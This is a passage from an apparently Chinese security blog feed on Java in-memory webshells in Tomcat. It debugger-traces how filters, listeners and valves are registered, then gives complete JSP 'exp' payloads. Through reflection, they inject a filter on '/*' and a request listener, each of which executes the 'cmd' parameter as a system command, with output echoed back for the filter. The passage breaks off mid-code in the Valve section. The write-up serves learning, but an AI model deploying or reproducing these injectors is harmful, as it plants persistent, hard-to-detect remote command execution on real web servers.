alt="image-20240916192256483"></p><p>这里往context里面添加filterdef，具体代码如下</p><p><img src="https://cdn.clown2024.cn/202409161924392.png" alt="image-20240916192439333"></p><p>添加到一个hashMap里面，下面是filterDef的相关属性</p><p><img src="https://cdn.clown2024.cn/202409192131516.png" alt="image-20240919213120425"></p><p>有些属性是我们到时候创建的时候需要设置的</p><p><img src="https://cdn.clown2024.cn/202409161925478.png" alt="image-20240916192510416"></p><p>这里是添加filterMap进去，再看一下filterMap里相关的属性</p><p><img src="https://cdn.clown2024.cn/202409192133213.png" alt="image-20240919213313122"></p><p>这就是访问路由前的注册内容</p><p><strong>访问之后</strong></p><p>现在我们写一个filter类，然后断在doFilter方法，看一下执行的过程</p><blockquote><p>这里的chain.doFilter是一定要写的不然就走不到servlet那里了，因为遍历doFilter之后，最终是在servletService()方法中走到request</p></blockquote><p><img src="https://cdn.clown2024.cn/202409192135120.png" alt="image-20240919213506978"></p><p>观察一下他的调用栈，可以看到是从StandardWrapperValve#invoke过来的，我们去看一下</p><p><img src="https://cdn.clown2024.cn/202409170050633.png" alt="image-20240917005012554"></p><p>所以可以知道是在filterChain的doFilter方法里面执行我们的filter和servlet</p><p>然后在找一下filterChain是在哪创建的</p><p><img src="https://cdn.clown2024.cn/202409170052061.png" alt="image-20240917005252976"></p><p>可以看到是在这里，接下来重新下断点到这，看一下filterChain的创建</p><p><img src="https://cdn.clown2024.cn/202409192140374.png" alt="image-20240919214048265"></p><p>这里先创建了一个ApplicationFilterChain然后看能否从req中获取filterChain，不能就新建一个ApplicationFilterChain同时set给req，继续往下</p><p><img src="https://cdn.clown2024.cn/202409170101254.png" alt="image-20240917010128142"></p><p>然后就是获取standardContext再从中获取filterMaps，然后看一下现在filterMaps里面的内容</p><p><img src="https://cdn.clown2024.cn/202409192144379.png" alt="image-20240919214407244"></p><p>可以看到有有我们自己的那个FilterMap</p><p><img src="https://cdn.clown2024.cn/202409170106138.png" alt="image-20240917010647039"></p><p>接下来会遍历filterMaps 中的 filterMap的filterName，如果发现符合当前请求 url 与 filterMap 中的 urlPattern 匹配且通过filterName能找到对应的filterConfig，则会将其加入filterChain</p><p>那来看一下ApplicationFilterConfig的创建</p><p><img src="https://cdn.clown2024.cn/202409192148887.png" alt="image-20240919214844764"></p><p>可以看到从StandardContext的filterConfigs里面直接根据key获取ApplicationFilterConfig的实例</p><p>最后看一下filterConfig的内容</p><p><img src="https://cdn.clown2024.cn/202409192151525.png" alt="image-20240919215145392"></p><p>包含了filter实例和filterDef还有context这几个重要元素，到此filterChain创建完成，然后就是执行前面说的的doFilter方法</p><h2 id="内存马编写"><a href="#内存马编写" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>前面分析可知，最重要的两个方法是**StandardContext.findFilterMaps()<strong>和</strong>StandardContext.findFilterConfig()**，我们只要往这2个属性里面插入对应的filterMap和filterConfig即可实现动态添加filter的目的，这些属性都在standardContext里面，那么standardContext里面是否也有添加这些属性的方法呢</p><p>这里standardContext提供了添加filterMap的方法<strong>addFilterMapBefore</strong></p><p><img src="https://cdn.clown2024.cn/202409170136347.png" alt="image-20240917013619268"></p><p>这里会先校验，然后再添加filterMap，跟进一下validateFilterMap方法</p><p><img src="https://cdn.clown2024.cn/202409170138616.png" alt="image-20240917013804538"></p><p>可以看到它会根据filterName去寻找对应的filterDef，如果没找到的话会直接抛出异常，也就是说我们还需要往filterDefs里添加filterDef。</p><p>关于filterDefs，StandardContext也直接提供了对应的添加方法addFilterDef</p><p><img src="https://cdn.clown2024.cn/202409170140748.png" alt="image-20240917014031687"></p><p>最后filterConfig并没有添加该属性的方法，需要我们通过反射获取属性进行修改</p><p><img src="https://cdn.clown2024.cn/202409170142816.png" alt="image-20240917014218759"></p><p>现在大部分的问题我们都解决了</p><p>下面是具体的代码实现</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%!<br><br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">// 获取StandardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br><br>    <span class="hljs-comment">// 创建一个filter实例</span><br>    Filter evilFilter=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-keyword">if</span> (request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/C&quot;</span>, request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>                <span class="hljs-comment">//将命令回显写入到response里面去</span><br>                response.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len));<br>                process.destroy();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-comment">//去执行doFilter方法</span><br>            chain.doFilter(request,response);<br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">// FilterDef</span><br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilterName(<span class="hljs-string">&quot;clown&quot;</span>);<br>    filterDef.setFilterClass(evilFilter.getClass().getName());<br>    <span class="hljs-comment">//这里估计也是在实例化filter的时候如果filterDef设置了就直接返回filter，因为调试的时候filterDef里面正常也是没有filter实例的</span><br>    filterDef.setFilter(evilFilter);<br>    <span class="hljs-comment">//添加FilterDef</span><br>    standardContext.addFilterDef(filterDef);<br><br>    <span class="hljs-comment">// FilterMap</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.setFilterName(<span class="hljs-string">&quot;clown&quot;</span>);<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    <span class="hljs-comment">//添加FilterMap</span><br>    standardContext.addFilterMapBefore(filterMap);<br><br>    <span class="hljs-comment">// 获取filterConfigs</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>    <span class="hljs-comment">//创建ApplicationFilterConfig</span><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<span class="hljs-comment">//将context和filterDef添加进去</span><br>    filterConfigs.put(<span class="hljs-string">&quot;clown&quot;</span>,filterConfig);<br><br>    out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br><br><br><br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409170203799.png" alt="image-20240917020309726"></p><p><img src="https://cdn.clown2024.cn/202409192246438.png" alt="image-20240919224412807"></p><p>成功！</p><blockquote><p>还有exp中的这行代码filterMap.setDispatcher(DispatcherType.REQUEST.name());</p><p>我搜了一下它是定义了过滤器可以介入的几种请求类型。这些类型包括：</p><ul><li><code>REQUEST</code>：普通的客户端请求。</li><li><code>FORWARD</code>：通过 <code>RequestDispatcher</code> 转发的请求。</li><li><code>INCLUDE</code>：通过 JSP 包含指令包含的资源。</li><li><code>ERROR</code>：作为错误页面请求。</li></ul><p>所以这行代码不是必须的，删掉也一样可以</p><p>而且这行代码只支持Tomcat 7.x 以上，因为javax.servlet.DispatcherType 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</p></blockquote><h1 id="listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h1><p>listener就是事件监听，java有很多中listener</p><p><img src="https://cdn.clown2024.cn/202409182314209.png" alt="image-20240918230547084"></p><p>大都是继承自EventListener接口，这里用ServletRequestListener，他有下面的两个方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.void requestInitialized(ServletRequestEvent sre)：<br>这个方法在 Servlet 请求对象被创建并且还没有被使用之前被调用。这通常发生在一个 HTTP 请求到达 Servlet 容器，并且容器决定为该请求创建一个新的 ServletRequest 对象时。这个方法可以用来初始化请求相关的资源，比如设置请求属性或者启动跟踪请求状态的逻辑。<br><br>2.void requestDestroyed(ServletRequestEvent sre)：<br>这个方法在 Servlet 请求对象即将被销毁时被调用。这通常发生在请求处理完成，响应已经发送给客户端之后。这个方法可以用来清理请求相关的资源，比如关闭数据库连接或者清理在 requestInitialized 方法中创建的任何对象。<br></code></pre></td></tr></table></figure><p>可以写一个简单的demo测试一下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servletshell;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListenerTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Listener 调用&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;servlet 离开&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>配置web.xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.clown.servletshell.ListenerTest<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>接下来就是照常分析一下Listener是怎么注册的了</p><p>这里直接从<strong>ContextConfig#configureContext</strong>那里开始分析，也就是访问前的过程</p><p>那就再去读取web.xml的那个地方看看</p><p><img src="https://cdn.clown2024.cn/202409191119893.png" alt="image-20240919111941724"></p><p>可以看到这里在添加filter之后就将listener的全类名进行添加，调用StandardContext#addApplicationListener方法</p><p>添加之后他会调用StandardContext#listenerStart</p><p><img src="https://cdn.clown2024.cn/202409191139786.png" alt="image-20240919113903688"></p><p>然后这里会查找我们添加的listener，到这步的代码比较复杂就不调了，有个数就行</p><p><strong>然后我们去访问网页</strong>，看一下请求过来时listener在哪里调用的</p><p><img src="https://cdn.clown2024.cn/202409191143445.png" alt="image-20240919114327349"></p><p>这里下个断点然后看看调用栈，看哪一个函数最重要</p><p><img src="https://cdn.clown2024.cn/202409191144058.png" alt="image-20240919114444926"></p><p>最重要的应该是这个函数StandardContext#fireRequestInitEvent</p><p>重新将断点下在这里看一看</p><p><img src="https://cdn.clown2024.cn/202409191151789.png" alt="image-20240919115146689"></p><p>可以看到它接受了request请求参数然后进行相关操作，然后这里获取一个listener数组</p><p>我们进该方法看看</p><p><img src="https://cdn.clown2024.cn/202409191155718.png" alt="image-20240919115507610"></p><p>可以看到applicationEventListenersList里面的就是我们的listener</p><p>而且StandardContext还有对应的添加listener的方法如下：</p><p><img src="https://cdn.clown2024.cn/202409191156621.png" alt="image-20240919115656529"></p><p>然后就是到下面遍历触发我们定义的listener的requestInitialized()方法</p><p><img src="https://cdn.clown2024.cn/202409191200195.png" alt="image-20240919120033087"></p><p>到这里流程就结束，这部分看起来还是比较简单的</p><p>相对应的请求结束的时候就会调用fireRequestDestroyEvent方法</p><p><img src="https://cdn.clown2024.cn/202409191232040.png" alt="image-20240919120248808"></p><h2 id="内存马编写"><a href="#内存马编写-1" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>通过上面的流程分析，exp的编写步骤也很简单：</p><p>就是通过 StandardContext 类的 <code>addApplicationEventListener()</code> 方法把恶意的 Listener实例放进去，然后恶意代码写在requestInitialized()方法里面即可</p><p>exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//获取standardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//创建恶意listener</span><br>    <span class="hljs-type">ServletRequestListener</span> <span class="hljs-variable">servletRequestListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestListener</span>()&#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br><br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">//添加监听器</span><br>    standardContext.addApplicationEventListener(servletRequestListener);<br>%&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>然后美美白屏弹计算器</p><p><img src="https://cdn.clown2024.cn/202409191342329.png" alt="image-20240919134253239"></p><p><img src="https://cdn.clown2024.cn/202409191342142.png" alt="image-20240919134258008"></p><blockquote><p>这里我认为是并没有相关路径的匹配逻辑，所以不需要在访问前的那部分注册</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里是本菜鸡开始学习内存马的起始文章&lt;/p&gt;
&lt;p&gt;有关内存马的认知可以看看su18师傅的这篇文章：&lt;a href=&quot;https://mp.weixin.qq.com/s/NKq4BZ8fLK7bsGSK5UhoGQ&quot;&gt;https://mp.weixin.qq.com/s/</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="内存马" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat中间件内存马</title>
    <link href="https://clowsman.github.io/2024/09/14/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://clowsman.github.io/2024/09/14/Tomcat%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-09-14T12:54:29.000Z</published>
    <updated>2024-09-27T14:53:07.569Z</updated>
    
    <content type="html"><![CDATA[<p>其实前面的传统web应用内存马也是tomcat这部分的，因为它基于tomcat进行分析不过问题不大，别的中间件应该也是有这些基本组件的。</p><h1 id="tomcat-valve内存马"><a href="#Tomcat-Valve内存马" class="headerlink" title="Tomcat-Valve内存马"></a>Tomcat-Valve内存马</h1><p>valve就是前面文章中说过的阀门，也就是pipeline(管道)机制，想了解得更加细致一点可以看看这篇文章：<a href="https://www.cnblogs.com/coldridgeValley/p/5816414.html%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%89%8D%E6%96%87%E6%8F%90%E5%88%B0%E7%9A%84%E6%80%BB%E7%BB%93%E5%A4%A7%E5%85%A8%E6%96%87%E7%AB%A0%E3%80%82">https://www.cnblogs.com/coldridgeValley/p/5816414.html，也可以看前文提到的总结大全文章。</a></p><p>这里放一张Valve的运行机制图</p><p><img src="https://cdn.clown2024.cn/202409211418602.png" alt="image-20240921141822546"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>经过前面的学习，现在分析起来还是比较简单的，这里就不自己配一个valve了，因为valve属于容器，需要在server.xml或者context.xml那里配置，看看文章就行，或者像文章里直接用springboot来搭建。</p><blockquote><p>Pipeline定义对应的接口是Pipeline，他的实现类是StandardPipeline，Valve定义对应接口Valve，他的抽象实现类是ValveBase，然后四个容器本身有的阀门为StandardEngineValve，StandardHostValve，StandardContextValve，StandardWrapperValve。</p></blockquote><p>这里直接看源码分析</p><p><img src="https://cdn.clown2024.cn/202409211514128.png" alt="image-20240921151457990"></p><p>我们在访问filter的时候可以从调用栈看到很多的valve，我们可以去看一下这些wrapperValve</p><p><img src="https://cdn.clown2024.cn/202409211518432.png" alt="image-20240921151844389"></p><p>可以看到继承的是ValveBase这个类，这个类是一个抽象类，然后它又实现了Valve接口，看一下Valve接口有什么，直接copy一下文章的内容，因为他加了注释</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.catalina;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Request;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Response;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Valve</span> &#123;<br>    <span class="hljs-comment">// 获取下一个阀门</span><br>    <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">// 设置下一个阀门</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve valve)</span>;<br>    <span class="hljs-comment">// 后台执行逻辑，主要在类加载上下文中使用到</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">backgroundProcess</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">// 执行业务逻辑</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><br>        <span class="hljs-keyword">throws</span> IOException, ServletException;<br>    <span class="hljs-comment">// 是否异步执行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAsyncSupported</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们可以看一下每一级的Valve是怎么调用的</p><p><img src="https://cdn.clown2024.cn/202409211533484.png" alt="image-20240921153326414"></p><p>在Host调用Context的</p><p><img src="https://cdn.clown2024.cn/202409211533055.png" alt="image-20240921153355996"></p><p>在Context调用Wrapper的</p><p>然后我们重新下断点从context.getPipeline开始看，利用点从这里开始，因为我们好获取的就是context</p><p><img src="https://cdn.clown2024.cn/202409211538211.png" alt="image-20240921153810150"></p><p>这里会走到父类的ContainerBase的getPipeline方法，ContainerBase是所有容器的抽象父类</p><p><img src="https://cdn.clown2024.cn/202409211539334.png" alt="image-20240921153916289"></p><p>然后我们去看看这个pipeline</p><p><img src="https://cdn.clown2024.cn/202409211540918.png" alt="image-20240921154014879"></p><p>是一个StandardPipeline类，也就是我们前面说过的Pipeline的实现类</p><p><img src="https://cdn.clown2024.cn/202409211541679.png" alt="image-20240921154104632"></p><p>看看Pipeline的接口方法</p><p><img src="https://cdn.clown2024.cn/202409211541979.png" alt="image-20240921154142926"></p><p>可以看到有addVavle方法，那么StandardPipeline就有相应的实现方法</p><p><img src="https://cdn.clown2024.cn/202409211543271.png" alt="image-20240921154312200"></p><p>那我们打内存马的思路就出来了</p><p>我们只需要利用context.getPipeline然后addVavle进去一个我们自己写的恶意valve即可</p><h2 id="内存马编写"><a href="#内存马编写" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>exp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Valve&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>    <span class="hljs-comment">//1.获取standardContext</span><br>    <span class="hljs-comment">//获取ApplicationContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>    <span class="hljs-comment">//获取StandardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//获取Pipeline</span><br>    <span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> standardContext.getPipeline();<br>    <span class="hljs-comment">//添加恶意Valve</span><br>    pipeline.addValve(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Valve</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Valve <span class="hljs-title function_">getNext</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNext</span><span class="hljs-params">(Valve 